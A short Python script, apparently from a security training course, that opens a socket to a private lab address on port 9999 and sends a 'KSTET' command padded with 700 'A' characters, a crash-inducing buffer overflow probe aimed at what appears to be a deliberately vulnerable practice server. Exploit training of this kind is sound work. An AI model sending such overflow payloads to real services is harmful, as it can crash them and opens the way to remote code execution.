# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

import sys
import socket


evilString = "A" * 700

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()
